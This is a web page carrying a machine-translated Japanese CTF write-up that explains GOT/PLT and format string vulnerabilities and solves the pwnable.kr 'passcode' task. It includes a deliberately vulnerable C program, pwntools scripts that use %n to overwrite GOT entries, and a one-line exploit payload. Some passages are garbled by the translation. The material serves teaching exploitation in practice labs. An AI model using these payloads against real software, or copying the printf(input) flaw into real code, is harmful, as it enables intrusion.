<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>😼 🥌 💼 pwnable.kr 05-パスコードでジョブを解決します。フォーマット文字列の脆弱性によるプロシージャリンクテーブルの書き換え 🍊 🤸🏻 💅</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="この記事では、オフセットのグローバルテーブル、プロシージャの関係のテーブル、およびフォーマット文字列の脆弱性によるその書き換えについて分析します。また、サイトpwnable.krから5番目のタスクを解決します。
 
 組織情報 , - , :
 
 

- PWN;
- (Crypto);
- c ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>pwnable.kr 05-パスコードでジョブを解決します。フォーマット文字列の脆弱性によるプロシージャリンクテーブルの書き換え</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460647/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="画像"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、オフセットのグローバルテーブル、プロシージャの関係のテーブル、およびフォーマット文字列の脆弱性によるその書き換えについて分析します。</font><font style="vertical-align: inherit;">また、サイト</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwnable.kr</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">から5番目のタスクを解決します</font><font style="vertical-align: inherit;">。</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">組織情報</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    </a>.<br>
<cut></cut><br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">グローバルオフセットテーブルとプロシージャ関係テーブル</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
動的にリンクされたライブラリは、起動時または実行時に別のファイルからメモリに読み込まれます。したがって、メモリ内のそれらのアドレスは、他のライブラリとのメモリ競合を回避するために固定されていません。さらに、ASLRセキュリティメカニズムは、起動時に各モジュールのアドレスをランダム化します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
グローバルオフセットテーブル（GOT）-データセクションに格納されているアドレスのテーブル。コンパイル時に不明だったグローバル変数のアドレスを検索するために実行時に使用されます。このテーブルはデータセクションにあり、すべてのプロセスで使用されるわけではありません。コードのセクションによって参照されるすべての絶対アドレスは、このGOTテーブルに格納されます。コードセクションでは、相対オフセットを使用してこれらの絶対アドレスにアクセスします。したがって、ライブラリコードは、異なるメモリアドレス空間にロードされている場合でも、プロセスで共有できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プロシージャリンケージテーブル（PLT）には、GOTにアドレスが格納されている共通関数を呼び出すためのジャンプコードが含まれています。つまり、PLTには、GOTからのデータ（アドレス）のアドレスが格納されるアドレスが含まれています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
例を使用してメカニズムを検討してください：</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外部関数printfがプログラムコードで呼び出されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">制御フローはPLTのn番目のレコードに進み、遷移は絶対アドレスではなく相対オフセットで発生します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOTに格納されているアドレスに移動します。</font><font style="vertical-align: inherit;">GOTテーブルに格納されている関数ポインターは、最初にPLTコードスニペットをポイントします。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">したがって、printfが初めて呼び出される場合は、動的リンカーコンバーターが呼び出され、ターゲット関数の実際のアドレスが取得されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printfアドレスがGOTテーブルに書き込まれ、printfが呼び出されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printfがコードで再度呼び出された場合、printfのアドレスはすでにGOTに格納されているため、リゾルバーは呼び出されなくなります。</font></font></li>
</ol><cut></cut><br>
<img src="https://habrastorage.org/webt/j4/yh/xf/j4yhxfc-twcuo9m9e5o2nanwoug.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この遅延バインディングを使用する場合、実行時に使用されない関数へのポインターは許可されません。</font><font style="vertical-align: inherit;">したがって、時間を大幅に節約できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このメカニズムが機能するために、次のセクションがファイルに存在します。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.got-GOTのエントリが含まれます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.lt-PLTのエントリが含まれます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.got.plt-アドレス関係GOT-PLTが含まれます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.plt.got-アドレス関係PLT-GOTが含まれています。</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
.got.pltセクションはポインターの配列であり、プログラムの実行中に満たされる（つまり、書き込みが許可される）ため、そのうちの1つを上書きしてプログラムの実行フローを制御できます。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">フォーマット文字列</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
書式文字列は、書式指定子を使用した文字列です。</font><font style="vertical-align: inherit;">フォーマット指定子は記号「％」で示されます（パーセント記号を入力するには、シーケンス「%%」を使用します）。</font></font><br>
<br>
<pre><code class="cpp hljs">pritntf(“output %s <span class="hljs-number">123</span>”, “str”);<font></font>
<font></font>
output str <span class="hljs-number">123</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
最も重要なフォーマット指定子：</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d-10進数の符号付き数値、デフォルトサイズ、sizeof（int）;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xとXは符号なしの16進数で、xは小文字（abcdef）、Xは大文字（ABCDEF）、デフォルトのサイズはsizeof（int）です。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s-終了バイトがゼロの行出力。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nは、nを含むコマンドシーケンスが出現したときに書き込まれた文字数です。</font></font></li>
</ul><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">書式文字列の脆弱性が可能である理由 </font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この脆弱性は、フォーマットを指定せずにフォーマット出力関数の1つを使用することにあります（次の例のように）。</font><font style="vertical-align: inherit;">したがって、私たちは自分で出力形式を指定できます。これにより、スタックから値を読み取り、特別な形式を指定してメモリに書き込むことができます。</font></font><br>
<cut></cut><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次の例の脆弱性を検討してください。</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
   <span class="hljs-keyword">char</span> input[<span class="hljs-number">100</span>];
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Start program!!!\n"</span>);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Input: "</span>);
   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;input);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nYour input: "</span>);
   <span class="hljs-built_in">printf</span>(input);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
   <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、次の行は出力形式を指定していません。</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-built_in">printf</span>(input);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プログラムをコンパイルします。</font></font><br>
<br>
<pre><code class="bash hljs">gcc vuln1.c -o vuln -no-pie</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
書式指定子を含む行を入力して、スタックの値を見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/i9/ib/es/i9ibeshbd2zhx5zmza0gxoegc-e.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、printf（入力）を呼び出すと、次の呼び出しがトリガーされます。</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-built_in">printf</span>(“%p-%p-%p-%p-%p“);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プログラムが何を表示するかを理解する必要があります。</font><font style="vertical-align: inherit;">printf関数には、フォーマット文字列のデータであるいくつかの引数があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次の引数を使用した関数呼び出しの例を考えてみます。</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-built_in">printf</span>(“Number - %d, addres - %<span class="hljs-number">08</span>x, <span class="hljs-built_in">string</span> - %s”, a, &amp;b, c);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この関数が呼び出されると、スタックは次のようになります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/vo/rj/n2/vorjn2194dvix4kr4mmzutja890.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、フォーマット指定子が検出されると、関数はスタックの値を取得します。</font><font style="vertical-align: inherit;">同様に、この例の関数は、スタックから5つの値を取得します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/uj/_j/vc/uj_jvcokc0m81teugsjel-ovzsk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記を確認するために、スタック内でフォーマット文字列を見つけます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tm/og/pm/tmogpmxoiospc4wwcybi3daw-3u.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
16進数ビューから値を変換すると、文字列「％-p％AAAA」が取得されます。</font><font style="vertical-align: inherit;">つまり、スタックから値を取得することができました。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOT上書き</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
フォーマット文字列の脆弱性を介してGOTを書き換える機能を確認しましょう。</font><font style="vertical-align: inherit;">これを行うには、exit（）関数のアドレスをmainのアドレスに書き換えて、プログラムをループさせます。</font><font style="vertical-align: inherit;">pwntoolsを使用して上書きします。</font><font style="vertical-align: inherit;">初期レイアウトを作成し、前のエントリを繰り返します。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<font></font>
<font></font>
ex = process(<span class="hljs-string">'./vuln'</span>)<font></font>
<font></font>
payload = <span class="hljs-string">"AAAA%p-%p-%p-%p-%p-%p-%p-%p"</span><font></font>
<font></font>
ex.sendline(payload)<font></font>
<font></font>
ex.interactive()</code></pre><br>
<img src="https://habrastorage.org/webt/ln/ej/lh/lnejlh85r86iny9le7wepst28mo.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ただし、入力された文字列のサイズに応じて、スタックの内容は異なるため、入力ロードには常に同じ数の入力文字が含まれていることを確認します。</font></font><br>
<br>
<pre><code class="python hljs">payload = (<span class="hljs-string">"%p-%p-%p-%p"</span>*<span class="hljs-number">5</span>).ljust(<span class="hljs-number">64</span>, ”*”)</code></pre><br>
<img src="https://habrastorage.org/webt/h8/sg/wg/h8sgwghgqjftpqreusafipcpz0s.png" alt="画像"><br>
<br>
<pre><code class="python hljs">payload = (<span class="hljs-string">"%p-%p-%p-%p"</span>).ljust(<span class="hljs-number">64</span>, ”*”)</code></pre><br>
<img src="https://habrastorage.org/webt/gj/bw/d-/gjbwd-9aigcck02hc2k9og5nfve.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、exit（）関数のGOTアドレスとメイン関数のアドレスを見つける必要があります。</font><font style="vertical-align: inherit;">メインアドレスはgdbを使用して検索されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/fp/bm/nn/fpbmnn6xs2bquxngua1igncslnm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
exit（）のGOTアドレスは、gdbとobjdumpの両方を使用して見つけることができます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_a/2o/pm/_a2opmke0_snnf_hczyzh0xtl64.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/qj/dj/yp/qjdjypxsia_iz1clauydnmtwdgy.png" alt="画像"><br>
<br>
<pre><code class="bash hljs">objdump -R vuln</code></pre><br>
<img src="https://habrastorage.org/webt/sf/of/qo/sfofqo2pj9dyvb57yf9hsdc1uw8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらのアドレスをプログラムに書き込みます。</font></font><br>
<br>
<pre><code class="python hljs">main_addr = <span class="hljs-number">0x401162</span>
exit_addr = <span class="hljs-number">0x404038</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、アドレスを書き換える必要があります。</font><font style="vertical-align: inherit;">スタックの場合、関数exit（）のアドレスとその後のアドレスを追加する必要があります。</font><font style="vertical-align: inherit;">*（exit（））+ 1など </font><font style="vertical-align: inherit;">ロードを使用して追加できます。</font></font><br>
<br>
<pre><code class="python hljs">payload = (<span class="hljs-string">"%p-%p-%p-%p-"</span>*<span class="hljs-number">5</span>).ljust(<span class="hljs-number">64</span>, <span class="hljs-string">"*"</span>)<font></font>
payload += pack(<span class="hljs-string">"Q"</span>, exit_addr)<font></font>
payload += pack(<span class="hljs-string">"Q"</span>, exit_addr+<span class="hljs-number">1</span>)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
実行して、アドレスを表示するアカウントを決定します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_f/pg/cj/_fpgcjghcjfywqnhdh8qd1mc1ak.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらのアドレスは、位置14および15に表示されます。次のように、特定の位置の値を表示できます。</font></font><br>
<br>
<pre><code class="python hljs">payload = (<span class="hljs-string">"%14$p"</span>).ljust(<span class="hljs-number">64</span>, <span class="hljs-string">"*"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/xl/ss/3u/xlss3uiye9rnbwz9jxmn5skxcry.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2つのブロックでアドレスを書き換えます。</font><font style="vertical-align: inherit;">まず、住所が2番目と4番目の位置になるように4つの値を出力します。</font></font><br>
<br>
<pre><code class="python hljs">payload = (<span class="hljs-string">"%p%14$p%p%15$p"</span>).ljust(<span class="hljs-number">64</span>, <span class="hljs-string">"*"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/yw/sy/py/ywsypywco_6skjhhsw1qr40bupc.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、main（）のアドレスを2つのブロックに分割します。</font></font><br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x401162 </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
1）0x62 = 98（0x404038に書き込む）</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2）0x4011-0x62 = 16303（0x404039に書き込む）</font></font></blockquote><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次のように書きます。</font></font><br>
<br>
<pre><code class="python hljs">payload = (<span class="hljs-string">"%98p%14$n%16303p%15$n"</span>).ljust(<span class="hljs-number">64</span>, <span class="hljs-string">'*'</span>)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
完全なコード：</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<font></font>
<font></font>
start_addr = <span class="hljs-number">0x401162</span>
exit_addr = <span class="hljs-number">0x404038</span><font></font>
<font></font>
ex = process(<span class="hljs-string">'./vuln'</span>)<font></font>
<font></font>
payload = (<span class="hljs-string">"%98p%14$n%16303p%15$n"</span>).ljust(<span class="hljs-number">64</span>, <span class="hljs-string">'*'</span>)<font></font>
payload += pack(<span class="hljs-string">"Q"</span>, exit_addr)<font></font>
payload += pack(<span class="hljs-string">"Q"</span>, exit_addr+<span class="hljs-number">1</span>)<font></font>
<font></font>
ex.sendline(payload)<font></font>
<font></font>
ex.interactive()</code></pre><br>
<img src="https://habrastorage.org/webt/qi/vg/vr/qivgvrhzkucvpzfs6s-zwftuuhk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、プログラムは終了する代わりに再起動されます。</font><font style="vertical-align: inherit;">exit（）アドレスを書き直しました。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パスコードジョブソリューション </font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
パスコード署名のある最初のアイコンをクリックすると、SSH経由でパスワードguestで接続する必要があることが通知されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/h2/jc/tj/h2jctjxsee5hardpu6glunfg2fk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
接続すると、対応するバナーが表示されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/-a/me/pp/-ameppolfflavwiv35qbkkgvg-8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバー上にあるファイルと、私たちが持っている権利を調べてみましょう。</font></font><br>
<br>
<pre><code class="bash hljs">ls -l</code></pre><br>
<img src="https://habrastorage.org/webt/ds/2m/gv/ds2mgvxu30ah53peas04_wypwja.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、すべての人に読み取る権利があるため、プログラムのソースコードを読み取り、所有者の権限（スティッキービットが設定されている）でパスコードプログラムを実行できます。コードの結果を見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/mj/wr/ldmjwru5rsabi6jyr9o8rrbt2ps.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ログイン（）関数でエラーが発生しました。 scanf（）では、2番目の引数には変数＆passcode1のアドレスは渡されず、変数自体が渡され、初期化されません。変数はまだ初期化されていないため、前の命令の実行後に残った、書き込まれていない「ゴミ」が含まれています。つまり、scanf（）は、数値をアドレスに書き込みます。これが残差データになります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/vt/5m/w4/vt5mw46djsyiiqhn5h7veqoi8b4.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、ログイン関数を呼び出す前にこのメモリ領域を制御できる場合は、任意のアドレスに任意の数を書き込むことができます（実際にはプログラムロジックを変更します）。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
login（）関数はwelcome（）関数の直後に呼び出されるため、同じスタックフレームアドレスを持っています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tj/zr/yi/tjzryim0sirg0i4t3agtqk4loty.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
将来のパスコード1の場所にデータを書き込めるかどうかを確認してみましょう。</font><font style="vertical-align: inherit;">プログラムをgdbで開き、login（）関数とwelcome（）関数を逆アセンブルします。</font><font style="vertical-align: inherit;">どちらの場合もscanfには2つのパラメーターがあるため、変数のアドレスが最初に関数に渡されます。</font><font style="vertical-align: inherit;">したがって、passcode1のアドレスはebp-0x10、名前はebp-0x70です。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qv/sj/li/qvsjliyjrjehr1lmvptgi5piju4.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/5t/uy/z3/5tuyz3pptyf76e32xe2idow-rnm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、ebp値が同じであるという条件で、名前に関連するアドレスpasscode1を計算します。</font></font><br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（＆name）-（＆passcode1）=（ebp-0x70）-（ebp-0x10）= -96 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
＆</font><font style="vertical-align: inherit;">passcode1 </font><font style="vertical-align: inherit;">==＆name + 96</font></font></blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">つまり、名前の最後の4バイト-これは、ログイン機能に書き込むためのアドレスとして機能する「ゴミ」です。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、GOTのアドレスを書き換えてアプリケーションのロジックを変更する方法を説明しました。</font><font style="vertical-align: inherit;">ここでやりましょう。</font><font style="vertical-align: inherit;">フラッシュはscanf（）の後に続くため、GOTのこの関数のアドレスに、システム（）関数呼び出し命令のアドレスを書き込んでフラグを読み取ります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/kx/8i/fk/kx8ifk5y4nzodxayzfdr0pyfjaa.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/hh/2l/sx/hh2lsxqchatzgvyhvzi_xqj8-ac.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/nc/vd/bw/ncvdbwjevpugfpt62no2jrnbumk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
つまり、アドレス0x804a004で10x形式で0x80485e3を書き込む必要があります。</font></font><br>
<br>
<pre><code class="bash hljs">python -c <span class="hljs-string">"print('A'*96 + '\x04\xa0\x04\x08' + str(0x080485e3))"</span> | ./passcode</code></pre><br>
<img src="https://habrastorage.org/webt/rh/pu/gf/rhpugfjpmu0ykmcgyc_geflsm5s.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その結果、10ポイントを獲得しました。これまでのところ、これは最も難しいタスクです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mg/fm/0-/mgfm0-rba6sb8aehxzm583xrrg4.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事のファイルは、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">テレグラムチャネルに</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添付されてい</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">次の記事でお会いしましょう！</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
：私たちは電報チャネルである</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">電報でチャンネル</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja460635/index.html">CLRium＃6：並行性と並列性。2日間：プロセッサーから非同期/待機まで</a></li>
<li><a href="../ja460637/index.html">ZigBeeライトコントロール</a></li>
<li><a href="../ja460641/index.html">YouTokenToMe：VKontakteチームからのテキストの迅速なトークン化のためのツール</a></li>
<li><a href="../ja460643/index.html">球上の点の均一な分布</a></li>
<li><a href="../ja460645/index.html">良いこと、悪いこと：Goで邪悪なコードを書く、パート1</a></li>
<li><a href="../ja460651/index.html">匿名テスター協会の会議：TMS、モニタリングモニタリング、検索品質評価、ネイティブiOSテスト</a></li>
<li><a href="../ja460655/index.html">電報を壊した方法</a></li>
<li><a href="../ja460659/index.html">パイプを使用したピボット</a></li>
<li><a href="../ja460661/index.html">Node.jsについて知っておくべきこと</a></li>
<li><a href="../ja460665/index.html">ドラフトFAQ：C ++標準が3年ごとに出てくるのはなぜですか？</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>